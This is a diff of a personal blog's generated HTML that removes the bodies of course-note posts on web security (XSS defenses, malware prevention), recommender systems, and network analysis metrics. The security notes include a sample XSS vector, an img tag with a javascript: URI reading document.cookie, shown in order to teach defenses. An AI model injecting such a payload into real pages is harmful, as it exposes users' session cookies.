-<li>Do not attempt to identify active content and remove, filter, or sanitize it. (too many types)</li>
-<li>We strongly recommend a ‘positive’ security policy that <u>specifies what is allowed.</u> </li>
-</ul>
-<p>ASP.NET output filtering</p>
-<p>validateRequest: (on by default)</p>
-<ul>
-<li>Crashes page if finds <code>&lt;script&gt;</code> in POST data.</li>
-<li>Looks for hardcoded list of patterns</li>
-<li>Can be disabled: &lt;%@ Page validateRequest=“false” %&gt;</li>
-</ul>
-<p>Caution: Scripts not only in \<script>!</p>
-<p> JavaScript as scheme in URI</p>
-<ul>
-<li><code>&lt;img src=“javascript:alert(document.cookie);”&gt;</code></li>
-</ul>
-<p>JavaScript On{event} attributes (handlers)</p>
-<h4 id="Client-side-XSS-defenses"><a href="#Client-side-XSS-defenses" class="headerlink" title="Client-side XSS defenses"></a>Client-side XSS defenses</h4><p>Proxy-based: analyze the HTTP traffic exchanged between user’s web browser and the target web server by scanning for special HTML characters and encoding them.</p>
-<p>Application-level firewall: analyze browsed HTML pages for hyperlinks that might lead to leakage of sensitive information and stop bad requests using a set of connection rules.</p>
-<p>Auditing system: monitor execution of JavaScript code and compare the operations against high-level policies to detect malicious behavior.</p>
-<hr>
-<h2 id="Malware-Prevention"><a href="#Malware-Prevention" class="headerlink" title="Malware Prevention"></a>Malware Prevention</h2><p>Goal: Reduce the harm.</p>
-<h3 id="Preventing-the-Introduction"><a href="#Preventing-the-Introduction" class="headerlink" title="Preventing the Introduction"></a>Preventing the Introduction</h3><h3 id="Vulnerability-Response"><a href="#Vulnerability-Response" class="headerlink" title="Vulnerability Response"></a>Vulnerability Response</h3><p>Discovery, Publication, Patch available, Patch deployed.</p>
-<h3 id="Failure-Containment"><a href="#Failure-Containment" class="headerlink" title="Failure Containment"></a>Failure Containment</h3><p>Gazelle’s Approach</p>
-<ul>
-<li>Inspect cross-origin HTTP responses</li>
-<li>Filter unexpected content types</li>
-</ul>
-<p>Another approach: Cookie Blocking</p>
-<p>Block the “Cookie” header for cross-domain resource loads.</p>
-<p>deterministic function cannot produce pure random..</p>
-</script></p>
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/10/Internet Security Notes/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -931,7 +486,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/19/Digital Communities Notes P3/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/19/Digital Communities Notes P2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Jiangfeng Du">
@@ -950,7 +505,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/02/19/Digital Communities Notes P3/" itemprop="url">Digital Communities Notes P3</a></h1>
+                <a class="post-title-link" href="/2017/02/19/Digital Communities Notes P2/" itemprop="url">Digital Communities Notes P2</a></h1>
         
 
         <div class="post-meta">
@@ -998,367 +553,15 @@
 
       
         
-          
-            <h1 id="Recommender-Systems"><a href="#Recommender-Systems" class="headerlink" title="Recommender Systems"></a>Recommender Systems</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>A recommender system aims at <em>predicting</em> the rating or preference that a <em>user</em> would<br>give to an <em>item</em> that she has not yet considered.<br><strong><em>Goals</em></strong>: relevant, novel, serendipity, diverse.</p>
-<h2 id="Collaborative-Filtering-Recommender-Systems"><a href="#Collaborative-Filtering-Recommender-Systems" class="headerlink" title="Collaborative Filtering Recommender Systems"></a>Collaborative Filtering Recommender Systems</h2><h3 id="Memory-based-methods"><a href="#Memory-based-methods" class="headerlink" title="Memory-based methods"></a>Memory-based methods</h3><p>Also called Neighborhood-based  CF.</p>
-<h4 id="User-based-CF"><a href="#User-based-CF" class="headerlink" title="User-based CF"></a>User-based CF</h4><p><strong>Def</strong>: ratings provided by users that are similar to a target user <em>u</em> are used to make recommendations for <em>u</em>.</p>
-<p>To determine the <strong>neighborhood </strong>of the target user, we need to compute <strong><em>similarity</em></strong> to all other users.</p>
-<p>Target user <strong><em>u</em></strong>, the similarity of u and one of other users <strong><em>v</em></strong> is computed:</p>
-<ul>
-<li><p>Find the mutually observed ratings. (Given by both u and v)</p>
-</li>
-<li><p>Compute the mean rating, denoted as $\mu_u$ and $\mu_v$</p>
-</li>
-<li><p>Calculate Pearson correlation coefficient between u and v, $Covariance(u,v)/Standard Deviation(u) * Standard Deviation(v)$, the number of term depends on mutually observed ratings.</p>
-<p>$\sum_{k\in mutually ratings}  (r_{uk}-\mu_u)*(r_{vk}-\mu_v)$</p>
-</li>
-<li>Let $P_u(j)$ be the set of users who are similar to the target user u and who have rated item j before.<br>predicted rating $\hat r_{uj}= \mu_u+\frac {\sum_{v\in P_u(j)}sim(u,v)(r_{vj}-\mu_v)}{\sum_{v\in P_u(j)}|sim(u,v)| }$</li>
-</ul>
-<p>$sim(u,v)$ is equal to $cos(u,v)$ where u is the rating vector of user u with all ratings subtract the mean value.</p>
-<h5 id="Pros"><a href="#Pros" class="headerlink" title="Pros"></a>Pros</h5><ul>
-<li>Works for any kind of item. No feature selection needed.</li>
-</ul>
-<h5 id="Cons"><a href="#Cons" class="headerlink" title="Cons"></a>Cons</h5><ul>
-<li>Not all neighbor ratings might be equally “valuable”.<br>Agreement on commonly liked items is not so informative as agreement on controversial items. Tend to recommend popular items.<br>相似度高可能表现在都对 普遍好评 的产品给出高评价，这个不意味着两个用户之间真的相似。<ul>
-<li>Give more weight to items that have a higher variance</li>
-</ul>
-</li>
-<li>Value of number of co-rated items.<ul>
-<li>Linearly reducing the weight when the number of co-rated items is low</li>
-</ul>
-</li>
-<li>Case amplification<ul>
-<li>Give more weight to “very similar” neighbors, i.e., where the similarity value is close to 1.</li>
-</ul>
-</li>
-<li>Neighborhood selection<br>Use similarity threshold or fixed number of neighbors</li>
-<li>High sparsity leads to few common ratings between two users.</li>
-</ul>
-<h4 id="Item-based-CF"><a href="#Item-based-CF" class="headerlink" title="Item-based CF"></a>Item-based CF</h4><p><strong>Def</strong>: firstly determine a set of other items <em>S</em>, which are most similar to item <em>i</em>. Then a weighted average of the ratings in <em>S</em> is used to predict the rating that <em>u</em> will likely give to <em>i</em>.<br>Item-to-item similarity is commonly based on measuring the <strong>cosine similarity</strong> between the rating vectors.</p>
-<p>Let $U_i$ be the set of users who have rated item i before, and let $\mu_u$ be the mean rating of a user $u$.</p>
-<p>the number of term depends on users rate both item $i$ and $j$.<br>$AdjustedCosine(i, j) = \frac{\sum_{u\in U_i\cap U_j}  (r_{uk}-\mu_u)<em>(r_{vk}-\mu_v)}{Standard Deviation(i)</em>Standard Deviation(j)} $<br>Let $Q_t(i)$ be the <strong>set of top-k items</strong> most similar to item $t$ for which user $u$ has specified ratings.<br>$\hat r_{ut}=\frac {\sum_{j\in Q_t(i)}AdjustedCosine(j,t) * r_{uj}}{\sum_{j\in Q_t(i)}|AdjustedCosine(j,t)| }$<br>找到相似度高的物品，利用该用户对其他物品的评价来评估对目标物品的评价。</p>
-<h5 id="Discussion"><a href="#Discussion" class="headerlink" title="Discussion"></a>Discussion</h5><ul>
-<li>We can calculate all pair-wise item similarities <em>in advance</em>, because item similarities are supposed to be more stable than user similarities.</li>
-<li>The neighborhood to be used at run-time is typically rather small, because only items are taken into account which the user has rated.</li>
-<li>Memory requirements<br>In theory, up to $n^2$ pair-wise similarities need to be memorized (n = number of items). In practice, the number may be smaller.</li>
-<li>New items cannot be recommended.</li>
-</ul>
-<p>Further reductions possible, for example:</p>
-<ul>
-<li>Minimum threshold for co-ratings (items, which are rated at least by t users).</li>
-<li>Limit the size of the neighborhood (might affect recommendation accuracy).</li>
-</ul>
-<p>A solution to the problem of rating sparsity is to segment users based on their profile, for example age, gender, country, education (a.k.a. demographic filtering).</p>
-<h3 id="Model-based-Collaborative-Filtering"><a href="#Model-based-Collaborative-Filtering" class="headerlink" title="Model-based Collaborative Filtering"></a>Model-based Collaborative Filtering</h3><p>Model-based collaborative filtering relies on a summarized model of the data that is created beforehand during a training phase. This model is then used in the later prediction phase to efficiently calculate the predictions.</p>
-<h4 id="Advantages"><a href="#Advantages" class="headerlink" title="Advantages"></a>Advantages</h4><ul>
-<li>Space-efficiency: Typically, the size of the learned model is much smaller than the original ratings matrix.</li>
-<li>Training speed and prediction speed: Model-based systems are usually much faster in the preprocessing phase of constructing the trained model.</li>
-<li>Avoiding overfitting: The summarization approach of model-based methods can often help in avoiding overfitting.</li>
-</ul>
-<p>Model-based collaborative filtering methods include, for example, rule-based methods, decision trees, regression models, Bayes classifiers, support vector machines, or neural networks.</p>
-<h4 id="Association-Rule-Mining"><a href="#Association-Rule-Mining" class="headerlink" title="Association Rule Mining"></a>Association Rule Mining</h4><p>Association Rule Mining is a technique to identify rulelike relationship patterns in large-scale transactions.</p>
-<ul>
-<li>An example rule could be: “If a customer purchases baby food then he or she also buys diapers in 70 percent of the cases”.  <code>[&#39;daɪəpə]</code>尿布</li>
-</ul>
-<p>The frequency of a given itemset is known as <em>support count</em>. The <em>support</em> of the itemset is the fraction of transactions that contain it. A frequent itemset is an itemset with a support that is greater or equal to a minsup threshold. </p>
-<p>The <em>confidence</em> of the rule is how often items in Y appear in transactions that contain X.</p>
-<p>A two-step approach: (1) Generate all itemsets with high <em>support</em> (Frequent Itemset Generation); (2) Generate high confidence rules from each frequent itemset (Rule Generation).</p>
-<h4 id="Matrix-factorization-Singular-Value-Decomposition"><a href="#Matrix-factorization-Singular-Value-Decomposition" class="headerlink" title="Matrix factorization / Singular Value Decomposition"></a>Matrix factorization / Singular Value Decomposition</h4><p>Matrix factorization methods can be used in recommender systems to <em>derive a set of latent (hidden) factors</em> from the rating patterns and characterize both users and items by such vectors of factors.</p>
-<p>$M = UΣV^T$</p>
-<p>where U and V are called left and right singular vectors and the values of the diagonal of Σ are called the singular values.</p>
-<p>The main point of the SVD is that we can approximate the full matrix by observing only the most important features, i.e., those with the largest singular values.</p>
-<p>Matrix U and V correspond to the latent user and item factors. In M, user ratings are row vector, item ratings are column vector.</p>
-<h2 id="Content-based-Recommender-Systems"><a href="#Content-based-Recommender-Systems" class="headerlink" title="Content-based Recommender Systems"></a>Content-based Recommender Systems</h2><p>Content-based recommender systems rely on a <strong>user’s own ratings</strong> and try to identify new items that are <strong>content-wise similar</strong> to the items the user has liked before.</p>
-<p>Content-wise similarity is defined on the attributes of items.</p>
-<p>Content-based recommender system relies on two concepts: user profile and item profile.</p>
-<ul>
-<li>User profile: previous explicit or implicit feedback the user has generated about various items.</li>
-<li>Item profile: a set of content-centric attributes for a particular item, for example, a genre, a textual description, or a list of keywords. For example, a movie with a profile vector with each entry corresponding to one actor.</li>
-</ul>
-<h4 id="Feature-extraction-techniques"><a href="#Feature-extraction-techniques" class="headerlink" title="Feature extraction techniques"></a>Feature extraction techniques</h4><p>Let N be the number of all documents (items) D that can be recommended.<br>Let $f_{t,d}$ be the number of times that term t occurs in document d.<br>term frequency: $TF(t,d)=\frac {f_{t,d}}{max_x\lbrace f_{x,d}\rbrace}$</p>
-<p>(divided by the maximum raw frequency of any term in the document)</p>
-<p>inverse document frequency measures how common or rare a term is across all documents:</p>
-<p>$IDF(t)=log\frac{N}{|\lbrace d\in D:t\in d\rbrace|}$</p>
-<p>N divided by number of docs that mention term i.</p>
-<p>term frequency-inverse document frequency(TF-IDF) is the multiply result.</p>
-<p>It is large when the term occurs frequently in one document d, but occurs rarely across all documents.</p>
-<p>TF-IDF is one possible measure to create individual item profiles:</p>
-<p>$Profile(d)=(TFIDF(t_1,d),TFIDF(t_2,d),…,TFIDF(t_j,d))$ (Vector)</p>
-<p>where j is the number of terms in d.</p>
-<p>Similarity between two items can be calculated the cosine between the item profile vectors.</p>
-<p>In practice, it is very common (and advisable) to preprocess documents before calculating TF-IDFs. Common steps are, for example:</p>
-<ul>
-<li>Removing stop words, i.e., very common terms such as “a”, “the”, “I”, “it”, etc.</li>
-<li>Stemming, i.e., reducing all words to their stems.</li>
-</ul>
-<h4 id="Content-based-learning-of-user-profiles"><a href="#Content-based-learning-of-user-profiles" class="headerlink" title="Content-based learning of user-profiles"></a>Content-based learning of user-profiles</h4><p>Use profile of item rated by the user to calculate user-profile. </p>
-<p>Weight sum of profiles of items according to ratings. </p>
-<h4 id="Filtering-and-recommendation"><a href="#Filtering-and-recommendation" class="headerlink" title="Filtering and recommendation"></a>Filtering and recommendation</h4><p>Similarity between user-profile and possibly recommending item-profile.</p>
-<h4 id="Pros-1"><a href="#Pros-1" class="headerlink" title="Pros"></a>Pros</h4><ul>
-<li>No need for data on other users.</li>
-<li>Able to recommend new items. No first-rater problem.</li>
-<li>Can explain why items are recommended (add features selected)</li>
-</ul>
-<h4 id="Limitations"><a href="#Limitations" class="headerlink" title="Limitations"></a>Limitations</h4><ul>
-<li>Data analysis: all items must be available in a data format that can be automatically parsed in order to extract the features. (hard for audio or video streams )</li>
-<li>Equality of features: If two items are represented by the same set of features, it is not possible anymore to distinguish between the two.</li>
-<li>Overspecialization: can occur when only items with a very high degree of utility are recommended. Then, if a user has never rated items from a certain group of items, he will not get any recommendations for them. (introduce some randomness in order to increase the diversity of recommendations)</li>
-<li>New user problem: inaccurate due to few ratings. How to build a user profile?</li>
-</ul>
-<h2 id="Knowledge-based-Recommender-Systems"><a href="#Knowledge-based-Recommender-Systems" class="headerlink" title="Knowledge-based Recommender Systems"></a>Knowledge-based Recommender Systems</h2><p>Knowledge-based recommender systems rely on explicitly soliciting user requirements for items. Well suited to the recommendation of items that are not bought on a regular basis (for example, house, car, etc.).  <code>[sə&#39;lɪsɪt]</code></p>
-<p>Constraint-based Recommender Systems: users specify requirements or constraints (for example, lower or upper limits) on the item.</p>
-<p>Three types of input for a constrained-based recommender system:</p>
-<ul>
-<li>Inherent properties of the user (e.g, demographics, risk profiles) and specific requirements in the product.</li>
-<li>Knowledge bases, which map user attributes to products attributes. For example, a user who is searching for a house and who has a family size of 5 will likely require ≥ 3 bedrooms.</li>
-<li>The product catalog, which contains all the item attributes.</li>
-</ul>
-<p>Case-based Recommender Systems: specific cases are specified by the user as targets or anchor points.</p>
-<p>A similarity function is used to retrieve the examples that are most <em>similar</em> to the <em>user-specified target</em>. </p>
-<h2 id="Evaluating-Recommender-Systems"><a href="#Evaluating-Recommender-Systems" class="headerlink" title="Evaluating Recommender Systems"></a>Evaluating Recommender Systems</h2>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/18/Digital Communities Notes P2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Jiangfeng Du">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="迷雾">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/02/18/Digital Communities Notes P2/" itemprop="url">Digital Communities Notes P2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-18T17:45:56+01:00">
-                2017-02-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Network-Analysis"><a href="#Network-Analysis" class="headerlink" title="Network Analysis"></a>Network Analysis</h1><h2 id="Network-density"><a href="#Network-density" class="headerlink" title="Network density"></a>Network density</h2><p>a simple, undirected graph $G$ with $n$ vertices and $m$ edges.</p>
-<p><strong>Mean degree</strong> $c=\frac{1}{n}\sum_{i=1}^n\delta(i)=\frac{2m}{n}$</p>
-<p><strong>Network density</strong> $ρ(G)=\frac{m}{n \choose 2}=\frac{2m}{n(n-1)}=\frac{c}{n-1}$</p>
-<p>If the density ρ tends to a <em>constant</em> as $n → ∞$, the network is said to be <strong>dense</strong>.</p>
-<p>A network in which $ρ → 0$ as $n → ∞$ is said to be <strong>sparse</strong>.</p>
-<h2 id="Average-Path-Length"><a href="#Average-Path-Length" class="headerlink" title="Average Path Length"></a>Average Path Length</h2><p>$\bar d(u)=\frac{1}{|V|-1}\sum_{v\in V,v\neq u}d(u,v)$ 点</p>
-<p>$\bar d(G)=\frac{1}{|V|}\sum_{u\in V}\bar d(u)$ 图</p>
-<p>The <strong>characteristic path length</strong> of G is defined as the <strong>median</strong> over all $\bar d(u)$. 中位数</p>
-<h2 id="Clustering-Coefficient"><a href="#Clustering-Coefficient" class="headerlink" title="Clustering Coefficient"></a>Clustering Coefficient</h2><p>a simple connected, undirected graph G</p>
-<p>vertex $v ∈ V(G)$ with neighbor set $N(v)$. Let $n_v = |N(v)|$, $m_v$ be the number of edges in the <em>subgraph induced</em> by $N(v)$, $m_v = |E(G[N(v)])|$.</p>
-<p>$cc(v)= \begin{cases} \frac{m_v}{n_v \choose 2}=ρ(G[N(v)]) &amp; \text{if $\delta(v)&gt;1$} \\undefined &amp; \text{otherwise} \end{cases}$</p>
-<p>$cc(G)$对所有$\delta(v)&gt;1$的点的cc取平均。</p>
-<h2 id="Degree-Correlation"><a href="#Degree-Correlation" class="headerlink" title="Degree Correlation"></a>Degree Correlation</h2><p>Let G be a simple graph with degree sequence $d = [d1, . . . , dn]$.</p>
-<p>$r_{deg}(G)=\frac{Covariance}{Variance}=\frac{\sum^n_{i=1}\sum^n_{j=i+1}((d_i-\bar d)(d_j-\bar d)A_{ij})}{\sum^n_{i=1}(d_i-\bar d)^2}$</p>
-<p>Note: $j=i+1$, 取矩阵对角线右上方，$A_{ij}=1$的$i,j$计算。</p>
-<p>意义不明。比如regular图，所有点的度数相同，分母为0。</p>
-<h2 id="Assortative-Mixing"><a href="#Assortative-Mixing" class="headerlink" title="Assortative Mixing"></a>Assortative Mixing</h2><p>The network is called <strong>assortative</strong> if a significant fraction of the edges in the network run between nodes of the same type.</p>
-<p>People have, it appears, a tendency to associate with others whom they perceive as being <em>similar</em>. Such a tendency is also called <strong>homophily </strong>or <strong>assortative mixing</strong>.</p>
-<h3 id="Assortative-mixing-by-enumerative-characteristics"><a href="#Assortative-mixing-by-enumerative-characteristics" class="headerlink" title="Assortative mixing by enumerative characteristics"></a>Assortative mixing by enumerative characteristics</h3><p>enumerative <code>[ɪ&#39;njʊməretɪv]</code></p>
-<p>a finite set of classes (labels) for the nodes. For example, genre, language, school class etc.</p>
-<p><strong>Goal</strong>: the network is assortative if a significant fraction of the edges run between vertices of the same type.</p>
-<p>We want a measure that is <em>large</em> for <em>non-trivial</em> cases and <em>small</em> for <em>trivial</em> ones.  <code>[&#39;trɪvɪəl]</code></p>
-<p><strong>Idea</strong>: we calculate the fraction of edges that run between vertices of the same type, and then we <em>subtract</em> from that figure the fraction of such edges we find if edges were positioned at <em>random</em> without regards to vertex type.</p>
-<p>计算相同种类之间的边的数目 - 随机分布情况下相同种类之间的边的数目</p>
-<p>$c_i$ : the class or type of vertex <em>i</em>.</p>
-<p>$n_c$: number of classes.</p>
-<p>The total number of edges that are incident to vertices of the same type:</p>
-<p>$N_{same}=\sum_{edges(i,j)} \delta(c_i,c_j) = \frac{1}{2}\sum_{ij}A_{ij}*\delta(c_i,c_j)$</p>
-<p>where $\delta(x,y)= \begin{cases} 1 &amp; x=y\\0 &amp;x\neq y \end{cases}$</p>
-<p>The expected number of edges between all pairs of vertices of the same type:</p>
-<p>$N_{rand}=\frac{1}{2}\sum_{ij}\frac{k_ik_j}{2m}\delta(c_i,c_j)$</p>
-<p>$k_i$ is the degree of vertex $i$. </p>
-<p>$P(A)$ =P(particular edge is one of the $k_j$ ends attached to vertex $j$) = $k_j/2m$</p>
-<p>$P(AB)$ = P(particular edge between one of $k_i$ and one of $k_j$ ends) = $k_i/2m * k_j/2m$</p>
-<p>Number of the edges = E(particular edge between i and j) = $m<em>P(AB)=\frac{1}{2}</em>\frac{k_ik_j}{2m}$</p>
-<p><strong>modularity</strong>: measure the strength of division of a network into modules (also called groups, clusters or communities). Networks with <em>high</em> modularity have <em>dense</em> connections between the nodes <em>within modules</em> but <em>sparse</em> connections between nodes <em>in different modules</em>.</p>
-<p>$Q = \frac {N_{same}-N_{rand}}{m} = \frac{1}{2m}\sum_{ij}(A_{ij}-\frac{k_ik_j}{2m})\delta(c_i,c_j)$</p>
-<h3 id="Assortative-mixing-by-scalar-characteristics"><a href="#Assortative-mixing-by-scalar-characteristics" class="headerlink" title="Assortative mixing by scalar characteristics"></a>Assortative mixing by scalar characteristics</h3><p>scalar characteristics such as age or income, i.e., values that are ordered.</p>
-<p>A common approach to determine assortative mixing by scalar characteristics is to use a <strong>covariance measure</strong>.</p>
-<p>Let $x_i$ be the value for vertex i of the scalar value. (每个点对应一个表示类型的数值)</p>
-<p>$均值=\sum_边\frac{每条边的两个端点的x值}{所有边的端点数量=2m}$</p>
-<p><strong>Mean</strong> $\mu$ of the value of $x_i$ at the <em>end of an edge</em>:  $\mu=\frac{\sum_{ij}A_{ij}x_i}{2m} = \frac{\sum_i k_ix_i}{2m}$</p>
-<p><strong>covariance</strong> of $x_i$ and $x_j$ over edges is:</p>
-<p>$cov(x_i,x_j)=\frac{\sum_{ij}A_{ij}(x_i-\mu)(x_j-\mu)}{2m}=(\frac 1 {2m}\sum_{ij}A_{ij}x_ix_j)-\mu^2$</p>
-<p>$\mu^2=\frac 1 {(2m)^2}\sum_{ij}k_ik_jx_ix_j$</p>
-<p>$cov(x_i,x_j)=\frac 1 {2m} \sum_{ij}(A_{ij}-\frac {k_ik_j}{2m})x_ix_j$</p>
-<p>The covariance will be <strong>positive</strong>, if, overall, $x_i$ and $x_j$ at an incident edge are <em>both large or both small</em> and negative if they tend to vary in opposite directions.</p>
-<p>To <strong>normalize</strong> is to make it 1 in a <em>perfectly mixed network</em> (all edges fall between vertices with precisely equal values of $x_i$). 意味着$x_i=x_j$当$A_{ij}=1$.</p>
-<p>So the covariance value for <em>perfectly mixed network</em><br>$V_{perfect}=\frac 1 {2m} \sum_{ij}(A_{ij}x_i^2-\frac {k_ik_j}{2m}x_ix_j)=\frac 1 {2m} \sum_{ij}(k_i\delta_{ij}-\frac {k_ik_j}{2m})x_ix_j$</p>
-<p>这里第二个等号有问题啊….$\delta{ij}$解释不清，求和号意味着i和j不会相等。</p>
-<p><strong>assortativity coefficient</strong>:</p>
-<p>$r =cov(x_i,x_j)/V_{perfect}$</p>
-<h2 id="Centrality"><a href="#Centrality" class="headerlink" title="Centrality"></a>Centrality</h2><h3 id="Degree-centrality"><a href="#Degree-centrality" class="headerlink" title="Degree centrality"></a>Degree centrality</h3><p>the degree of a vertex.</p>
-<h3 id="Eigenvector-centrality"><a href="#Eigenvector-centrality" class="headerlink" title="Eigenvector centrality"></a>Eigenvector centrality</h3><p><strong>Idea</strong>: extend the concept of degree centrality by <em>increasing a vertex’s importance</em> if it is connected to other vertices that are themselves important.</p>
-<p><strong>Goal</strong>: give each node a <em>score</em> <strong>proportional to</strong> the <em>sum of the scores</em> of its neighbors.</p>
-<p>对于undirected graph, 实对称矩阵A的不同特征值所对应的特征向量是正交的实向量。实对称矩阵A的特征值都是实数。</p>
-<p>$\hat x_i = \sum_j A_{ij}x_j$</p>
-<p>After t steps, we have a vector of centralities x(t) given by $x(t)=A^tx(0)$</p>
-<p>Write x(0) as a linear combination of eigenvectors $v_i$ of A:</p>
-<p>$x(0) =\sum_i c_iv_i$</p>
-<p>$x(t)=A^t\sum_i c_iv_i=\sum_i c_ik_i^tv_i=k_1^t\sum_i c_i[\frac {k_i}{k_1}]^t$</p>
-<p>$k_i$ are eigenvalues of A and $k_1$is the largest. When $t → ∞$, $x(t)→c_1k_1^tv_1$</p>
-<p>x(t) can be considered as $c_1v_1$, $x(t)$ is a eigenvector of A.</p>
-<p>$Ax=k_1x$</p>
-<p>The eigenvector centrality has the nice property that it can be large  ither because a vertex has many neighbors or because it has important neighbors (or both).</p>
-<p>All eigenvector centralities of all vertices are non-negative.</p>
-<p>Trap: if a vertex with no out-link, it will absorb centrality. Or all out-links are within the group. In this situation, it will make the eigenvector centrality very large.</p>
-<h4 id="Cons-in-directed-network"><a href="#Cons-in-directed-network" class="headerlink" title="Cons in directed network:"></a>Cons in directed network:</h4><ul>
-<li>A is asymmetric, this results in two leading eigenvectors.<br>In most cases it is better to use the <em>right eigenvector</em>, given that centrality in directed networks is bestowed by other vertices pointing towards you.</li>
-<li>A vertex with no incoming edges will always have a centrality of zero. This also affects its connected vertices, their centrality will also be zero.</li>
-</ul>
-<h3 id="Katz-Centrality"><a href="#Katz-Centrality" class="headerlink" title="Katz Centrality"></a>Katz Centrality</h3><p>Give each vertex a small amount $\beta$ of centrality for free:</p>
-<p>$x_i=\alpha \sum_j A_{ij}x_j+\beta$</p>
-<p>$x=\alpha Ax+\beta 1$</p>
-<p>$x=(I-\alpha A)^{-1}\beta 1$</p>
-<p>As we increase $\alpha$ from zero the centrality increases and eventually teher comes a point where they diverge. This happens where $(I-\alpha A)^{-1}$ diverges, i.e., when $det(I-\alpha A)$ passes through zero:</p>
-<p>$det(A-\alpha ^{-1}I=0)$ </p>
-<p>The determinant first crosses zero when $\alpha ^{-1}$ equals the largest eigenvalue of A. We should choose a value of $\alpha$ less than $1/k_1$ because then we can be sure that the corresponding matrix is invertible.</p>
-<p>Most researchers employ values of $\alpha$ close to $1/k_1$.</p>
-<p>Neumann series to invert a matrix M: $M^{-1}= \sum_{k=0}^\infty (I-M)^k$ and stop after an appropriate number of iterations.</p>
-<h3 id="PageRank"><a href="#PageRank" class="headerlink" title="PageRank"></a>PageRank</h3><p>Suppose web pages as vertices, super link as directed links.</p>
-<p>Out-going link is easier than in-coming link. So in-coming link from important pages should count more. But a high-centrality vertex pointing to many others gives the others also high centrality.</p>
-<p>So we split all of it PageRank to out links evenly.</p>
-<p>Flow of PageRank could be considered as flow of current in one node.</p>
-<p>$x_i=\alpha \sum_j A\frac {x_j} {k_j^{out}}+\beta$</p>
-<p>We require $k_j^{out}$ to be set to 1 in case the vertex has no outgoing edges.</p>
-<p>$x=\alpha AD^{-1}x+\beta 1$</p>
-<p>with D being the diagnoal matrix with elements $D_{ii}=max(k_i^{out},1)$ and we set $\beta =1$.</p>
-<p>$x=(I-\alpha AD^{-1})^{-1}1=[(D-\alpha A)D^{-1}]^{-1}1=D(D-\alpha A)^{-1}1$</p>
-<p>$\alpha$ should be less than the inverse of the largest eigenvalue of $AD^{-1}$.</p>
-<p>For an undirected network, this largest eigenvalue turns out to be 1.</p>
-<p>For a directed network in practical cases the leading eigenvalue will be roughly of order 1.</p>
-<p>For example, a common value is α = 0.85.</p>
-<h3 id="Closeness-centrality"><a href="#Closeness-centrality" class="headerlink" title="Closeness centrality"></a>Closeness centrality</h3><p>$C_c(i)=\frac{n-1}{\sum_j d(i,j)}$</p>
-<p>inverse of mean distance.</p>
-<h3 id="Betweenness-Centrality"><a href="#Betweenness-Centrality" class="headerlink" title="Betweenness Centrality"></a>Betweenness Centrality</h3><p>measures the extent to which a vertex lies on paths between other vertices.</p>
-<p>$C_B(v) = \sum_{s\neq v\neq t \in V} \frac{\sigma _{st}(v)}{\sigma _{st}}$</p>
-<p>$σ_{st}$ denote the number of shortest paths from $s ∈ V$ to $t ∈ V$.</p>
-<p>$σ_{st}(v)$ denote the number of shortest paths from s to t that some $v ∈ V$ lies on. </p>
-<p>For undirected networks the <em>normalized</em> betweenness centrality is given by  $C_B(v) /C_{n-1}^2$.</p>
-<p>For directed networks the <em>normalized</em> betweenness centrality is given by $C_B(v) /A_{n-1}^2$.</p>
-<h1 id="Random-networks"><a href="#Random-networks" class="headerlink" title="Random networks"></a>Random networks</h1><p>A random graph is a model network in which some specific set of parameters take fixed values, but the network is random in other respects.</p>
-<h2 id="Erdos-Renyi-Model"><a href="#Erdos-Renyi-Model" class="headerlink" title="Erdös Rényi Model"></a>Erdös Rényi Model</h2><p>also ER random graph $G(n,p)$ is an undirected graph with n nodes in which each two distinct vertices are connected by an edge with probability p.</p>
-<p>The set of all ER random graphs, with n vertices and probability p that two vertices are joined, is denoted by ER(n, p).</p>
-<p>The clustering coefficient of any ER(n, p) is equal to p.</p>
-<h2 id="Watts-Strogatz-Random-Graph"><a href="#Watts-Strogatz-Random-Graph" class="headerlink" title="Watts-Strogatz Random Graph"></a>Watts-Strogatz Random Graph</h2><p>WS(n, k, p) $n\gg k \gg ln(n)\gg 1  $.</p>
-<ol>
-<li><p>Order the n vertices into a ring and connect each vertex to its first k/2 left-hand (clockwise) neighbors, and its k/2 right-hand (counterclockwise) neighbors, leading to graph G.</p>
-</li>
-<li><p>With probability p, replace each edge $&lt; u, v &gt;$ with an edge $&lt; u, w &gt;$ where w is a<br>randomly chosen vertex from V(G) other than u, and such that $&lt; u, w &gt;$ is not already<br>contained in the edge set of (the modified) G.</p>
-</li>
-</ol>
